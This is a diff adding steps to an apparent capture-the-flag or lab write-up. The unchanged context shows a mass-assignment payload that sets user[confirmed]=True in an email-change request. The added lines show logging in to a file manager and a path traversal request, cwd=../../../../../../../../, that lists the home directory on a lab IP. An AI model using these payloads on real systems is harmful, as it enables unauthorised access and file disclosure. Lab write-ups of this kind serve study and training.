@@ -25,3 +25,14 @@ Add this to the payload  -   &user%5Bconfirmed%5D=True
 
 _method=patch&authenticity_token=_QlOu-myYsI4qa-ASLIILonpLq6osynvu13Pmk0nln3kFf28ppete5SOJVGvvx3FffC3obtJeveir0LXeEkudQ&user%5Bconfirmed%5D=True&user%5Bemail%5D=test%40test.com&commit=Change%20email
 ```
+Then we can successfully logged in to the file manager  
+We can upload and download files  
+the URL will change if we download a file
+```
+http://192.168.156.231/?cwd=&file=47631.txt&download=true
+```
+The cwd probably is the current working directory  
+We try to change it and it shows all files in home directory
+```
+http://192.168.156.231/?cwd=../../../../../../../../
+```
